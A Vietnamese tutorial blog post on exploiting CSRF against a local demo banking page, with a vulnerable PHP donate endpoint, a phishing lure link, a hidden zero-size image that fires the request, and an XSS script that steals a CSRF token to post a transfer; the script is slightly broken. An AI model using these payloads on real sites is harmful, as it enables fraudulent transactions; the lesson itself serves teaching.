<main class="main" role="main">
    <div class="content">
        <article id="post-csrf/csrf_khaithac" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    Kỹ Thuật Tấn Công CSRF
                </h1>
                <div class="article-meta">
               <span class="article-date">
               <i class="icon icon-calendar-check"></i>
               <a href="/2018/11/29/csrf/csrf_khaithac/" class="article-date">
               <time datetime="2018-11-29T10:18:18.064Z" itemprop="datePublished">2018-11-29</time>
               </a>
               </span>
                    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2018/11/29/csrf/csrf_khaithac/#comments" class="article-comment-link">Comments</a></span>
                </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Cac-buoc-khai-thac"><a href="#Cac-buoc-khai-thac" class="headerlink" title="Các bước khai thác"></a>Các bước khai thác</h1>
                <h2 id="Phan-tich-vi-du"><a href="#Phan-tich-vi-du" class="headerlink" title="Phân tích ví dụ"></a>Phân tích ví dụ</h2>
                <p>Người dùng bob đã đăng nhập trên hệ thống ngân hàng. Trang web đã tự động đăng nhập cho bạn và lưu session lại như sau.<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">session_start();</span><br><span class="line">$conn = connect_database();</span><br><span class="line">$rs = $conn-&gt;query(<span class="string">"SELECT * FROM csrf_account WHERE username='bob' AND password='bob123' LIMIT 1"</span>);</span><br><span class="line">$row = $rs-&gt;fetch_assoc();</span><br><span class="line">$taikhoan = $row[<span class="string">'taikhoan'</span>];</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = $row[<span class="string">'username'</span>];</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Trang web sẽ hiển thị lên tên người dùng đăng nhập và số tiền hiện có.<br>Có 2 chức năng cơ bản là nhắn tin và donate.</p>
                <h3 id="Donate"><a href="#Donate" class="headerlink" title="Donate"></a>Donate</h3>
                <p>Mỗi lần donate sẽ tốn 100$ (Coi như kẻ tấn công sẽ là người nhận được khoản tiền này).<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'donate'</span>]) &amp;&amp; ($_GET[<span class="string">'donate'</span>]) == <span class="number">1</span>){</span><br><span class="line">    $taikhoan -= <span class="number">100</span>;</span><br><span class="line">    $query = $conn-&gt;query(<span class="string">"UPDATE csrf_account SET taikhoan=$taikhoan"</span>);</span><br><span class="line">    $thongbao = <span class="string">'Đã donate và mất 100$'</span>;</span><br><span class="line">}</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Vậy URL để gửi request khi donate sẽ là:</p>
                <blockquote>
                    <p><a href="http://localhost/index.php?page=csrf_attack&amp;donate=1">http://localhost/index.php?page=csrf_attack&amp;donate=1</a></p>
                </blockquote>
                <h3 id="Gui-tin-nhan"><a href="#Gui-tin-nhan" class="headerlink" title="Gửi tin nhắn"></a>Gửi tin nhắn</h3>
                <p>Hacker sẽ gửi tin nhắn cho bob qua mẫu này. Mình làm khá đơn giản,coi như tự gửi tự nhận.</p>
                <h2 id="Tan-cong"><a href="#Tan-cong" class="headerlink" title="Tấn công."></a>Tấn công.</h2>
                <p>Ta xác định được URL mà bob dùng để gửi requests lên server để <strong>donate</strong> là:</p>
                <blockquote>
                    <p><a href="http://localhost/index.php?page=csrf_attack&amp;donate=1">http://localhost/index.php?page=csrf_attack&amp;donate=1</a></p>
                </blockquote>
                <p>Vậy mục tiêu của chúng ta là làm sao cho bob truy cập vào địa chỉ này thì ta sẽ thành công dùng quyền (session) và tài khoản của bob để thực hiện donate.</p>
                <h3 id="Tan-cong-xa-hoi"><a href="#Tan-cong-xa-hoi" class="headerlink" title="Tấn công xã hội."></a>Tấn công xã hội.</h3>
                <p>Ta có thể đánh lừa bob click vào link có chứa URL trên bằng các kỹ thuật xã hội, ví dụ như tin nhắn sau đây:<br></p>
                <figure class="highlight html">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Tin hot! Tin hot! Đừng chia sẻ với ai nhé bob<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://localhost/index.php?page=csrf_attack&amp;donate=1"</span>&gt;</span>Click vào ngay để nhận 1 triệu đồng!!!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Do hiếu kì hoặc bất cứ lí do gì, bob sẽ nhấn vào và mất tiền.</p>
                <p><strong>Nhớ để ý số tiền của bob nhé!</strong></p>
                <h3 id="Dung-cac-the-an-tu-dong-load"><a href="#Dung-cac-the-an-tu-dong-load" class="headerlink" title="Dùng các thẻ ẩn tự động load."></a>Dùng các thẻ ẩn tự động load.</h3>
                <p>Ta dùng các thể ví dụ như image,để link của đường dẫn trên, khi page được load, trình duyệt sẽ tự động gửi request đến URL để lấy hình về và không may thực thi luôn hành động donate với quyền của bob.<br></p>
                <figure class="highlight html">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">src</span>=<span class="string">"http://localhost/index.php?page=csrf_attack&amp;donate=1"</span> /&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Xin chào Bob<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Gửi và test thử xem tiền có bob có mất không nhé.</p>
                <h2 id="Dung-XSS-de-bypass-post-form-va-token"><a href="#Dung-XSS-de-bypass-post-form-va-token" class="headerlink" title="Dùng XSS để bypass post form và token."></a>Dùng XSS để bypass post form và token.</h2>
                <p>Như đã nói ở bài trước, XSS có thể sài cùng với CSRF để tăng độ nguy hiểm lên rất nhiều lần.<br>XSS có thể vượt qua được kiểm tra bằng token và post form.<br>Bởi vì XSS có thể chèn vào các mã client side, nó hoàn toàn có thể dùng javascript hoặc DOM để lấy thông tin từ biến token, rồi gửi thông tin lên bằng post bằng cách sử dụng <strong>XMLHttpRequest</strong>.</p>
                <p>Mình không dựng ví dụ về phần này, nhưng có giới thiệu và hướng dẫn sơ qua. Nếu có gặp ngoài thực tế cũng không bỡ ngỡ. Ví dụ như đoạn payload sau.<br></p>
                <figure class="highlight javascript">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="keyword">var</span> token = getElementById(<span class="string">"web_token"</span>); <span class="comment">//Lấy giá trị của token</span></span><br><span class="line"><span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> params = <span class="string">'chuyenkhoan=123&amp;sotien=1000&amp;token='</span>+token; <span class="comment">//Thêm token vào.</span></span><br><span class="line">xhttp.open(<span class="string">'POST'</span>, url, <span class="literal">true</span>);</span><br><span class="line">xhttp.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);</span><br><span class="line">xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{<span class="comment">//Call a function when the state changes.</span></span><br><span class="line">    <span class="keyword">if</span>(http.readyState == <span class="number">4</span> &amp;&amp; http.status == <span class="number">200</span>) {</span><br><span class="line">        alert(http.responseText);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">http.send(params); <span class="comment">//Send post data.</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
            </div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>
</main>